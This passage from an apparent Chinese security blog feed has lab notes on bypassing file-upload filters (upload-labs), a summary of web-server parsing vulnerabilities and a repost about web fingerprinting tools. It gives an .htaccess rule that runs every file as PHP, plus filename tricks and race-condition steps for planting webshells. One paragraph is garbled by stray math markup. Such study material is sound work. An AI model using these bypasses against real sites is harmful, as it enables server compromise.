htaccess文件一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<br>
.htaccess：apache拓展配置文件，可以与解析文件在同一个目录</p>
<p>故我们可以先上传htaccess文件，重新命名解析规则，只针对当前目录下<br>
首先上传htaccess内容为</p>
<pre><code>none
&lt;IfModule mime_module&gt;
SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
&lt;/IfModule&gt;
</code></pre>
<p>或<br>
AddType application/x-httpd-php .jpg  #将当前目录下jpg文件当作php运行<br>
再上传写入php的图片即可</p>
<p><strong>3）黑名单-大小写绕过-upload-labs-05</strong><br>
代码未过滤大小写，导致Php可上传后任可解析为php</p>
<p>** 4）黑名单-加点绕过-upload-labs-07**<br>
在windows中一个文件的后缀加上一个点与原来的后缀没有区别，从而用来文件上传绕过</p>
<p><strong>5）黑名单-空格绕过-upload-labs-06</strong><br>
由于没有对文件后缀名进行去空，因此可以在后缀名加空格绕过，文件属性不会变</p>
<p><strong>6）黑名单- ::$$DATA数据流绕过-upload-labs-08</strong><br>
在php+windows的情况下：如果文件名+”::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">把</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA“会把::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">“</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">把</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">：</mi><mn>1.</mn><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA“之前的文件名。
例如：1.php::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">“</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">：</span><span class="mord">1</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>$DATA<br>
<strong>1) 黑名单-配合解析绕过 upload-labs-9</strong><br>
由于代码对文件名最后是进行拼接的，可以伪造文件名<br>
代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过或者为</p>
<p><strong>8）黑名单-双后缀解析 upload-labs-10</strong><br>
由于代码函数逻辑原因，1.pphphp 最后经过函数过滤完又恢复为1.php从而绕过。具体还是要代码审计，查找配合解析漏洞</p>
<p><strong>白名单绕过</strong></p>
<p><strong>1）白名单-MIME绕过-uplod-labs-02</strong><br>
MIME即为Content-Type: image/gif 在有些时候对MIME有过滤，即可将允许上传文件MIMEcopy给要上传的文件属性，从而实现绕过</p>
<p><strong>2）白名单-%00截断-upload-labs–11</strong><br>
截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态<br>
%00截断用在数据包的文件url地址上面，在url地址文件地址后加上阶段即可</p>
<p>例：/upload/1.php%00 使拼接无法实现 原来图片包含文件内容将写入1.php ，访问1.php即可</p>
<p><strong>3）白名单-0x00截断-upload-labs-12</strong><br>
save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br>
由于get请求会对一些字符自动解码，而在post传递，不会对字符解码，故需要我们自己转换<br>
这种截断不同于%00，它是在数据包中间的文件地址，文件名后截断</p>
<p><strong>4）白名单-0x0a截断-</strong><br>
换行 代码：LF ASCII码：/ n ，十六进制，0x0a，换行至下一行行首起始位置</p>
<p><strong>0x03 其他类型绕过</strong><br>
1）文件头检测绕过<br>
图片文件以字符展示出来时候，每一种格式的图片的前几个字符是固定，或者是数据包里面的Content-Type类型修改，从而绕过上传</p>
<p><strong>2）二次渲染上传绕过-upload-labs-16</strong><br>
在我们将文件上传到服务器，有一些服务器会对上传的文件进行二次修改，以服务器的类型储存起来，但是文件的外表不会变化，文件的hex值会发生一些变化，在upload-16关，发现服务器对我们上传的问价进行二次渲染，当我们之前将一句话木马插入经过服务器储存后再次查看hex值发现很多地方的值发生改变，我们经过原图片hex值对比，发现会有不会改变的值，我们将木马插入到这一串不会改变的值的位置里面，从而实现上传webshell</p>
<p><strong>3）条件竞争绕过-upload-labs-17</strong><br>
竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。思路是首先上传一个php文件，当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
<p><strong>4）突破getimagesize 绕过-upload-labs-14</strong><br>
getimagesize这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的<br>
上传图片马，写入代码到图片，使用文件包含漏洞，访问该图片地址 http://127.0.0.1/include.php?file=upload/5220200729141211.jpeg，查看到 phpinfo</p>
<p><strong>5）突破exif_imagetype绕过-upload-labs-15</strong><br>
exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 2 的值是一样的，但exif_imagetype函数快得多，同getimagesize函数一样，也是修改文件头信息，配合文件包含漏洞上传</p>
<p>来源: 我就是告白<br>
文章作者: Hsy.Sec<br>
文章链接: http://kxsy.work/2021/07/13/wen-jian-shang-chuan-lou-dong/<br>
本文章著作权归作者所有，任何形式的转载都请注明出处。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[常见的解析漏洞总结]]></title>
        <id>https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/</id>
        <link href="https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/">
        </link>
        <updated>2021-10-10T01:11:39.000Z</updated>
        <content type="html"><![CDATA[<p>一、解析漏洞<br>
解析漏洞指的是服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。</p>
<p>二、常见的解析漏洞<br>
1、IIS5.x-6.x解析漏洞<br>
使用 IIS5.x-6.x 版本的服务器，大多为Windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，不能解析aspx文件。</p>
<p>目录解析漏洞</p>
<pre><code>      IIS6.0中的目录解析漏洞，如果网站目录中有一个 *.asp/ 的文件夹，那么该文件夹下面的一切内容都会被 IIS 当作 asp 脚本来执行，如/xx.asp/xx.jpg
</code></pre>
<p>文件解析漏洞</p>
<pre><code>      IIS6.0中的分号（;）漏洞，IIS在解析文件名的时候会将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg
</code></pre>
<p>解析文件类型</p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
<p>/test.asa<br>
/test.cer<br>
/test.cdx<br>
2、IIS 7.0/IIS 7.5/Nginx &lt; 8.03<br>
IIS 7.0/7.5，默认 Fast-CGI 开启。如果直接在 url 中图片地址<code>（*.jpg）后面输入/*.php</code>，会把正常图片解析为 php 文件。</p>
<pre><code>     在某些使用Nginx的网站中，访问http://www.xxser.com/1.jpg/1.php，1.jpg会被当作PHP脚本来解析，此时1.php是不存在的。这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。

    这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。
</code></pre>
<p>3、Nginx空字节漏洞<br>
影响版本：0.5、0.6、0.7&lt;=0.7.65、0.8&lt;= 0.8.37</p>
<pre><code>    Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：
</code></pre>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<pre><code>     也就是当Fast-CGI执行php时，http://127.0.0.1/1.jpg%00.php 会把1.jpg文件（木马文件）当做php文件来执行。
</code></pre>
<p>4、Apache（1.x、2.x）解析漏洞<br>
Apache（1.x,2.x）解析文件的原则：Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。</p>
<pre><code>     假如上传文件1.php.bb.rar，后缀名rar不认识，向前解析；1.php.bb，后缀名bb不认识，向前解析；1.php 最终解析结果为php文件。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。

     这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为php的文件）
</code></pre>
<p>5、其他<br>
在Windows环境下，<code>xx.jpg[空格]</code> 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，Windows会默认除去空格或点。黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样就可以getshell。</p>
<p>三、漏洞的修复<br>
及时更新安全补丁，随时关注最新的安全技术，及时关闭一些没有必要开启的服务。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[2021-9-4开学笔记]]></title>
        <id>https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/</id>
        <link href="https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/">
        </link>
        <updated>2021-09-13T01:23:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="2021-09-13">2021-09-13</h1>
<p>ip访问与域名访问有什么差别：（域名访问的时IP访问的真子集，IP访问的是根目录，域名访问的是根目录下的站点目录）</p>
<p>IP地址访问的时候是访问的www文件下的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504961949.png" alt="" loading="lazy"></p>
<p>而用域名访问的时候是特定的文件夹，是www文件下的一个文件<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504967445.png" alt="" loading="lazy"></p>
<p>IP地址访问的话就能扫到网站同一目录下的文件夹，包括数据备份文件和一下看不到的文件，因为一般人就把网站的备份文件就放在与网站同一目录下，如果用域名访问的话就不能扫到文件，而如果用IP地址扫描的话就能扫到了网站的备份文件</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1631504973512.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504977621.png" alt="" loading="lazy"><br>
添加这个东西之后放一个后缀名为xiaodi8的文件就能自动解析为asp文件（放一个asp后门）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504981216.png" alt="" loading="lazy"><br>
然后进行连接即可看见文件内部结构</p>
<p>文件夹属性<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504984321.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504988237.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504992831.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504996809.png" alt="" loading="lazy"></p>
<p>无：<br>
此时绕过思路就是换目录<br>
设置根目录的话就不科学，因为它里面正常文件有脚本型文件所以上面所述的给予无权限一般只给images文件加的权限<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631505001278.png" alt="" loading="lazy"></p>
<p>通过数据包的返回即可知道搭建的平台<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631505005537.png" alt="" loading="lazy"></p>
<h1 id="2021-09-14">2021-09-14</h1>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1631668904883.png" alt="" loading="lazy"></figure>
<p>本文通过分析web指纹的检测对象、检测方法、检测原理及常用工具，设计了一个简易的指纹搜集脚本来协助发现新指纹，并提取了多个开源指纹识别工具的规则库并进行了规则重组，开发了一个简单快捷的指纹识别小工具TideFinger，并实现了一套在线的指纹识别平台“潮汐指纹”，希望能为大家带来方便。</p>
<p>前言<br>
在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。</p>
<p>在指纹识别的学习过程中，借用了很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑等等，在此感谢各种大佬的无私奉献。本文并无技术上的创新和突破，只是把一些指纹库重新进行了整合和梳理并进行了开源。</p>
<p>tips：文末有福利<sub>我们将搜集到的一些指纹工具、指纹库等资料打包供大家下载</sub></p>
<p>常见指纹检测的对象<br>
1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p>
<p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p>
<p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p>
<p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p>
<p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p>
<p>6、操作系统信息：比如linux、win2k8、win7、kali、centos等；</p>
<p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p>
<p>8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；</p>
<p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p>
<p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p>
<p>常见的指纹识别方式<br>
1、特定文件的MD5<br>
一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p>
<p>2、正常页面或错误网页中包含的关键字<br>
先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。</p>
<p>或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。</p>
<p>3、请求头信息的关键字匹配<br>
根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。</p>
<p>根据response header一般有以下几种识别方式：</p>
<p>（1）查看http响应报头的X-Powered-By字段来识别；</p>
<p>（2）根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等；</p>
<p>（3）根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等；</p>
<p>（4）根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。</p>
<p>4、部分URL中包含的关键字，比如wp-includes、dede等URL关键特征<br>
通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用/solr目录，weblogic可能使用wls-wsat目录等。</p>
<p>5、开发语言的识别<br>
web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有：</p>
<p>（1）通过爬虫获取动态链接进行直接判断是比较简便的方法。</p>
<pre><code>asp判别规则如下 &lt;a[^&gt;]*?href=('|&quot;)[^http][^&gt;]*?\.asp(\?|\#|\1) ，其他语言可替换相应asp即可。
</code></pre>
<p>（2）通过 X-Powered-By 进行识别</p>
<p>比较常见的有 X-Powered-By: ASP.NET 或者 X-Powered-By: PHP/7.1.8</p>
<p>（3）通过 Set-Cookie 进行识别</p>
<p>这种方法比较常见也很快捷，比如 Set-Cookie 中包含 PHPSSIONID 说明是php、包含 JSESSIONID 说明是java、包含 ASP.NET_SessionId 说明是aspx等。</p>
<p>指纹识别工具<br>
在研究指纹识别技术的时候，不可避免的分析了大量指纹识别工具，在此将自己用过的几个感觉不错的工具和平台介绍一下。</p>
<p>国外指纹识别工具<br>
WhatWeb（推荐指数★★★★★）</p>
<pre><code>下载地址： https://github.com/urbanadventurer/WhatWeb
</code></pre>
<p>Whatweb 是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。</p>
<p>Whatweb 是基于 ruby 语言开发，因此可以安装在具备 ruby 环境的系统中，目前支持 Windows/Mac OSX/Linux。</p>
<pre><code>在debian/ubuntu系统下可直接`apt-get install whatweb`,kali已自带。
使用非常简单whatweb http://www.tidesec.net 即可，也可以加参数-v显示更详细的信息。
</code></pre>
<p>Wapplyzer（推荐指数★★★★）</p>
<pre><code>下载地址： https://github.com/AliasIO/Wappalyzer
</code></pre>
<p>Wappalyzer 是一个实用的跨平台网站分析工具，用于帮助开发者、研究者和设计者检测网页使用的是什么技术，以更好地衡量自己的项目中该使用什么技术。Wappalyzer 的功能和 BuiltWith 类似，可检测内容管理系统（CMS），电子商务平台、Web服务器、JavaScript框架和已安装的分析工具等。</p>
<p>Wappalyzer可直接在chrome或火狐的应用商城直接搜索安装。Wappalyzer目前可识别65个大类的1216个应用，查看可检测的应用程序列表：</p>
<pre><code>https://wappalyzer.com/applications
</code></pre>
<p>Whatruns（推荐指数★★★★）</p>
<p>Whatruns是为chrome开发的一款web指纹识别程序，还可以显示托管的CDN、wordpress插件、wordpress字体等，拥有丰富的插件支持。</p>
<p>跟Wappalyzer安装类似，Whatruns可直接在chrome应用商城直接搜索安装。</p>
<p>安装完成后，通过插件图标来获取服务的详细运行信息，效果如下。有时候信息会比Wapplyzer还详细一些，但有时候获取速度稍慢。</p>
<p>Plecost（推荐指数★★★）</p>
<pre><code>下载地址： https://github.com/iniqua/plecost
</code></pre>
<p>Plecost是Wordpress博客引擎的漏洞指纹识别和漏洞查找器，能识别Wordpress版本并能查找到cve，不过访问不了google的话可能有些功能就受限了。Plecost基于python架构，利用了Beautiful Soup来解析html、xml文件识别网站使用的插件及版本。</p>
<pre><code>使用也比较方便 plecost -i /usr/share/plecost/wp_plugin_list.txt http://www.freebuf.com
</code></pre>
<p>BlindElephant（推荐指数★★）</p>
<pre><code>下载地址： https://github.com/lokifer/BlindElephant
</code></pre>
<p>BlindElephant是一款Web应用程序指纹识别工具。该工具可以读取目标网站的特定静态文件，计算其对应的哈希值，然后和预先计算出的哈希值做对比，从而判断目标网站的类型和版本号。目前，该工具支持15种常见的Web应用程序的几百个版本。同时，它还提供WordPress和Joomla的各种插件。该工具还允许用户自己扩展，添加更多的版本支持。</p>
<p>不过该软件最新更新是在2013年，插件库应该算比较旧的了。</p>
<pre><code>下载及安装可参考 https://github.com/lokifer/BlindElephant ，kali中已经内置。

使用命令： BlindElephant.py http://www.freebuf.com wordpress
</code></pre>
<p>国内指纹识别工具<br>
御剑web指纹识别程序</p>
<pre><code>下载地址： https://www.webshell.cc/4697.html
</code></pre>
<p>御剑web指纹识别程序是御剑大神开发的一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少。</p>
<p>windows下图形界面，比较亲民，扫描速度略慢，指纹库略少，可手工更新。</p>
<p>Test404轻量WEB指纹识别</p>
<pre><code>下载地址： https://www.test404.com/post-1618.html
</code></pre>
<p>Test404轻量WEB指纹识别程序是一款CMS指纹识别小工具，配置灵活、支持自行添加字典、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快。可手动更新指纹识别库，而且该软件在2019.04月刚刚更新了一版。</p>
<p>w11scan分布式WEB指纹识别平台</p>
<p>w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增/修改指纹，建立批量的扫描任务，并且支持多种搜索语法。</p>
<pre><code>安装和下载可参考： https://github.com/w-digital-scanner/w11scan
</code></pre>
<p>手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。</p>
<p>Dayu指纹识别工具</p>
<pre><code>下载地址： https://github.com/Ms0x0/Dayu
</code></pre>
<p>“大禹”为一款c/s结构jar文件工具，只需本地安装java环境，加参数-u即可，具体设置参数可参考github介绍。</p>
<p>WebEye</p>
<pre><code>下载地址： https://github.com/zerokeeper/WebEye/
</code></pre>
<p>WebEye可快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架，使用异步实现指纹的快速识别。</p>
<p>识别速度比较快，不过指纹库不是很多，指纹库不是基于md5之类的，而是类似于fofa通过http头信息、关键字等进行快速识别。</p>
<p>作者对指纹进行了分类，如摄像头、waf、cdn、网络设备等，很多指纹都是精心搜集的。</p>
<p>WTF_Scan</p>
<pre><code>下载地址： https://github.com/dyboy2017/WTF_Scan
</code></pre>
<p>WTF团队出品的指纹识别平台，包括的功能也相对比较多，除了指纹识别外，还有DNS解析、子域名、CDN、端口扫描、敏感目录等。</p>
<p>不过就单独说指纹规则来说，不算很多，可以自己添加完善，在 WTF_Scan/wtf/app/api/cms/cms.txt 文件中进行指纹修改。</p>
<p>Webfinger</p>
<p>基于fofa的规则库进行快速检索，大约2000+条指纹数据，位于lib/web.db可自行添加修改。</p>
<pre><code>下载地址： https://github.com/se55i0n/Webfinger

类似的还有个CMSCAN https://github.com/cuijianxiong/cmscan/
</code></pre>
<p>FingerPrint</p>
<p>好像是百度的一个MM用perl写的一款工具，调用Wappalyzer模块进行指纹识别。</p>
<pre><code>下载地址： https://github.com/tanjiti/FingerPrint
</code></pre>
<p>在线指纹识别<br>
云悉指纹识别</p>
<pre><code>http://www.yunsee.cn/
</code></pre>
<p>指纹库很强大，速度也很快，我们前端还仿了下云悉的界面，免费服务，好像还能提供api接口，学习的榜样！</p>
<p>如果指纹能开源就好了，哈哈~~</p>
<p>bugscaner指纹识别</p>
<pre><code>http://whatweb.bugscaner.com/look/
</code></pre>
<p>目前好像指纹比较少，很多都识别不出来了。</p>
<pre><code>whatweb.net

https://whatweb.net/
</code></pre>
<p>之前功能还不错，现在好像只能查看到header信息了。</p>
<p>未知指纹发现<br>
目前新指纹的识别基本还是靠人工发现然后分析规则再进行添加，所以各平台都有提交指纹的功能，但是我们没有这种资源，只能另想办法。</p>
<p>于是想到了一个比较笨的方法：从网站中爬取一些静态文件，如png、ico、jpg、css、js等，提取url地址、文件名、计算md5写入数据库，这样再爬下一个网站，一旦发现有相同的md5，就把新的url也加入到那条记录中，并把hint值加1，这样爬取10W个站点后，就能得到一个比较客观的不同网站使用相同md5文件的数据了。</p>
<p>获取链接代码部分</p>
<pre><code>excludeext = ['.png', '.ico', '.gif','.svg', '.jpeg','js','css','xml','txt']

def getPageLinks(url):

try:
headers = requests_headers()

content = requests.get(url, timeout=5, headers=headers, verify=False).text.encode('utf-8')
links = []
tags = ['a', 'A', 'link', 'script', 'area', 'iframe', 'form']  # img
tos = ['href', 'src', 'action']
if url[-1:] == '/':
url = url[:-1]
try:
for tag in tags:
for to in tos:
link1 = re.findall(r'&lt;%s.*?%s=&quot;(.*?)&quot;' % (tag, to), str(content))
link2 = re.findall(r'&lt;%s.*?%s=\'(.*?)\'' % (tag, to), str(content))
for i in link1:
links.append(i)

for i in link2:
if i not in links:
links.append(i)

except Exception, e:
print e
print '[!] Get link error'
pass
return links
except:
return []
有兴趣的可以查看具体代码 https://github.com/TideSec/TideFinger/blob/master/count_file_md5.py 文件。
</code></pre>
<p>爬取的结果如下：</p>
<p>当然了，里面肯定很多都属于误报，比如上图中第一个其实是个500错误页面，所以出现的比较多，第二个是政府网站最下边那个常见的“纠错”的js，所以用的也比较多…</p>
<p>经过一些分析整理也发现了一些小众的CMS和建站系统的指纹，比如三一网络建站系统的 newsxx.php ，比如大汉JCM的 jhelper_tool_style.css 等等，后续会持续把这些新的指纹丰富到指纹库中去。</p>
<p>指纹识别脚本<br>
有了指纹库之后，识别脚本就相对比较简单了，已有的一些也都比较成熟了，直接使用了webfinger和whatcms的部分代码并进行了整合优化，于是就有了TideFinger。</p>
<p>1、功能逻辑都比较简单，先用fofa库去匹配，然后获取一定banner，如果banner中识别除了cms，则返回结果，如果未识别到cms，则会调用cms规则库进行匹配各规则。</p>
<p>2、脚本支持代理模式，当设置了-p参数，且 proxys_ips.txt 文件包含代理地址时，脚本会随机调用代理地址进行扫描，以避免被封ip，不过这样的话效率可能会低一些。毕竟搜集的免费代理质量还是差一些，速度会慢很多。有钱人可以找收费代理池，然后每个规则都用不同代理去请求，这样肯定不会被封！</p>
<p>代理地址的搜集可以使用我修改的另一个代理池 https://github.com/TideSec/Proxy_Pool ，提供了自动化的代理ip抓取+评估+存储+展示+接口调用。</p>
<p>3、经测试，一般网站把所有指纹跑一遍大约需要30秒时间，个别的网站响应比较慢的可能耗时更长一些，可以通过设置网站超时时间进行控制。</p>
<p>安装python2依赖库</p>
<pre><code>pip install lxml
pip install requests
pip install bs4
</code></pre>
<p>说明：sqlite3库在Python 2.5.x 以上版本默认自带了该模块，如提示sqlite3出错请自行排查。<br>
执行脚本</p>
<pre><code>$ python TideFinger.py

Usage: python TideFinger.py -u http://www.123.com [-p 1] [-m 50] [-t 5]

-u: 待检测目标URL地址
-p: 指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80
-m: 指纹匹配的线程数，不指定时默认为50
-t: 网站响应超时时间，默认为5秒
</code></pre>
<p>指纹识别界面如下：</p>
<p>指纹识别平台<br>
在有了指纹库和识别脚本之后，我们想继续完善下这个功能，于是又加入了其他一些功能，有了这个在线指纹</p>
<pre><code>查询平台 http://finger.tidesec.net 。
</code></pre>
<p>开始想加的很多，但后来在速度和时间方面不得不进行了一定的取舍，于是就有了目前如下的功能。</p>
<p>1、网站信息：网站标题、状态码、302跳转信息等；</p>
<p>2、IP地址信息：IP归属地、IP服务商信息、GPS信息；</p>
<p>3、CDN识别：对目标是否使用CDN进行检测，但目前CDN识别指纹还不多，对部分识别出使用CDN的目标还会列出来CNAME；</p>
<p>4、中间件识别：主要通过http头信息中的XPB、server等字段获取中间件信息，如nginx、iis、tomcat等；</p>
<p>5、更多banner：主要是调用了whatweb和Wapplyzer进行更多banner信息的获取，如jquery、bootstrap等；</p>
<p>6、操作系统识别：识别比较简单，通过ttl值和文件大小写是否敏感…用nmap去识别的话速度太慢…</p>
<p>小福利<br>
1、指纹检测工具下载<br>
我们把上面的13款 指纹识别工具 和搜集到的一些 论文资料 进行了汇总打包，大家可以直接下载。</p>
<pre><code>下载地址：https://pan.baidu.com/s/190K34cwjAWDUMLtR8EWvNA 提取码：5y4o 解压密码www.tidesec.net
</code></pre>
<p>后续如有更新，会在我们公众号 TideSec安全团队 上提供下载，回复“指纹工具”即可获取最新指纹识别工具下载地址。</p>
<p>2、指纹库下载<br>
我们在GitHub上提供的是2019年4月的指纹库（还未进行大量的命中率测试），后续我们还会优化调整命中策略、未知指纹识别方法，持续更新优化指纹库。</p>
<pre><code>https://www.tuicool.com/articles/iQBnAvv

https://www.freebuf.com/articles/web/202560.html?utm_source=tuicool&amp;utm_medium=referral
</code></pre>
<p>————————————————<br>
